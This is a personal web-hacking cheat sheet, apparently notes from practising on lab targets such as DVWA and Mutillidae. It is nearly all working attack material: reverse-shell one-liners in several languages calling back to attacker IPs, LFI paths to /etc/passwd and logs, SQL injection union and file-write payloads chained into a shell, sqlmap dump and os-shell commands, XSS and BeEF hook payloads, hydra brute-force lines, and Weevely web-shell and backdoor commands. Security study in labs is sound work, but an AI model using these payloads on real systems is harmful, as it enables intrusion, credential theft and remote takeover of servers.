

from kali:
weevely generate 123456 /root/shell.php
weevely http://META/uploads/shell.php 123456


---------------------
Code Execution:
Kali: 
nc -vv -l -p 8080

BASH
bash -i >& /dev/tcp/10.20.14.203/8080 0>&1

PERL
perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PHP
php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby
ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Netcat
nc -e /bin/sh 10.20.14 8080


ping 8.8.8.8 | pwd

ping 8.8.8.8 | nc -e /bin/sh KALI_IP 8080

ping 8.8.8.8 | nc -e /bin/sh 10.10.10.100 8080



-----------------------------------------------
LFI, RFI
/etc/passwd
/proc/self/environ
/var/log/auth.log
/var/log/apache2/access.log
 
 
 page=/../../../../../etc/passwd
 
 
 <?passthru("nc -e /bin/sh 10.10.10.100 8888");?>
 
 
 ---------------------------------------------
 SQL
 
 mysql -u root -h IP
 show databases;
 use information_schema
 show tables;
 select * from accounts
 then ;
 
 MYSQL CHEATSHEET:
 https://gist.github.com/hofmannsven/9164408
 
 ----------------------------------------------
 SQL injection
 
username =admin
password =aaa' or 1=1 #
or
username=admin' #

%23 na koncu username


1. verify number of colums so:
id=1' order by 2%23&PASSWORD OR SUBMIT
2. so change 2 na 1,2,3,4,5,6 etc and verify on which number there is an issue, so you can determine number of columns

extracting data from database:
username' order by 10%23&password=haslo ...

username' union select 1,2,3,4,5%23&password=haslo ... 

username' union select 1,database(),user(),version(),5%23&password=haslo ... 

username' union select 1,table_name,null,null,5 from information_schema.tables%23&password=haslo ... 

username' union select 1,username,password,is_admin,5 from accounts%23&password=haslo ... 

username' union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10'%23&password=haslo ... 

username' union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'accounts'%23&password=haslo ... 

username' union select user,password from users %23&

for MEDIUM
username' +uNioN/**/SElEct/**/table_name,2+fRom+information_schema.tables%23
username' union select table_name,2 from information_schema.tables where table_schema = 0x64767761 %23  (its a hex for dvwa)

Seleting database version:
UniOn selEct 1,version() /*

Database:
UniOn selEct 1,database() /*

Database user:
UniOn selEct 1,user() /*

Database tables:
UniOn selEct 1,table_name frOm information_schema.tables table_schema = '[database name]' /*

Table Columns:
UniOn selEct 1,column_name frOm information_schema.columns table_name = '[table name]' /*


Comments to end the quries:
/*
//
#
%23

Characters to use instead of spaces:
+, /**/, %20

Selecting data from table:
UniOn selEct 1,[column name] frOm [table name] /*

Reading files:
UniOn selEct 1,load_file('file location') /*

admin' union select null,load_file("/etc/passwd"),null,null,null%23

Writing files:
UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*

admin' union select null,'DUPA',null,null,null into outfile '/tmp/ASS.txt'%23


SQL Injection + local file inclusion = SHELL :
LOW:
1. save file to some outside location with write access:
http://10.10.10.99/dvwa/vulnerabilities/sqli/?id=1' union select '<?passthru("nc -e /bin/sh 10.10.10.100 8081");?>',null into outfile '/tmp/reverse3.php'%23&Submit=Submit#

it will show that file already exists =>GREAT, so has been writed
2. on kali run : nc -vv -l -p 8081
3. run in browser:
10.10.10.99/dvwa/vulnerabilities/fi/?page=../../../../../tmp/reverse3.php



DISCOVERING SQL AUTOmatically:

sqlmap -u ""

DB info:
sqlmap -u "" --dbs
sqlmap -u ""  --current-db
sqlmap -u ""  --tables -D DNBNAME

USER:
sqlmap -u ""  --current-user


sqlmap -u ""  --columns -T accounts -D owasp10

DATA:
sqlmap -u ""  -T accounts -D owasp10 --dump

SHELL:
sqlmap -u ""  --os-shell


SQL shell:
sqlmap -u ""  --sql-shell
then:
database()
user()
select table_name from information.schema.tables where table_schema =''



XSS:

-reflected: (low level)
<script>alert("Asshole")</script>
<IMG SRC=/ onerror="alert('xss')"></iMg>

medium level:
<ScrIpt>alert("Asshole")</sCriPt>

high level: not working 

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

username=" ;alert('SUNNY DAY'); //

-stored
the same , put into the name above


http://jdstiles.com/java/cct.html
so use: 
<SCRipt>alert(String.fromCharCode(120, 115, 115, 50))</ScRiPt>


DOM BASED XSS


XSS Vulnerabilities- Exploitation
for Beef use:
<script src="http://10.10.10.100/hook.js"></script>
so put:
/dvwa/vulnerabilities/xss_r/?name=<script src="http://KALI/hook.js"></script>#

BEEF: module search
alert
raw (java alert)
spy (print screen)
redirect


VEIL -Framework to generate backdoor:
git clone https://github.com/Veil-Framework/Veil.git
cd Veil
cd setup
./setup.sh



BRUTEFORCE
Creating a Wordlist
Crunch can be used to create a wordlist.
Syntax:
> crunch [min] [max] [characters] -t [pattern] -o [FileName]
Example:
> crunch 6 8 123abc$ -i wordlist -t a@@@@b

> hydra [IP] -L [usernames] -P [passwords] [service]
Example:
> hydra 10.20.14.212 -l admin -P /root/wordlist.txt http-post-form
"/mutillidae/?page=login.php:username=^USER^&password=^PASS^&lo
gin-php-submit-button=Login:F=Not Logged In"


so username is -l admin
-p password
-P wordlist for passwords

hydra -U http-post-form
and then check examples

examples:
hydra 10.10.10.99 -l admin -P /root/test.txt http-post-form "/mutillidae/index.php?page=login.php:username=^USER&password=^PASS^&login-php-submit-button=::Login:F=incorrect"



BEEF
OWASP ZAP

----------------------------------------------------------
POST EXPLOITATION with Weevely

on kali:
weevely generate 123456 /root/shell.txt
copy or download from victim and then from kali:
mv shell.txt shell.php
weeveley http://IP/dvwa/vulnerabilities/shell.php 123456

:system_info
:audit_etcpasswd
:audit_etcpasswd -vector posix_getpwuid
:audit_etcpasswd -vector file
:audit_etcpasswd -vector fread
:audit_etcpasswd -vector file_get_contents
:audit_etcpasswd -vector base64

execute shell commands:
:shell_sh pwd
:shell_sh ls
with vector:
:shell_sh -v passthru whoami

Download files to local machine:
file_download -vector [Filename] -host [host] [location to store file]

Upload files:
file_upload -vector [Filename] [location on local machine] [location to store file]


Backdoor:
backdoor_reversetcp -vector netcat [KALI IP] [Port]

SQL:
sql_console -h
sql_dump -h

sql_dump -vector -host [HOST] -lpath [location to store data] [DB] [username][password]
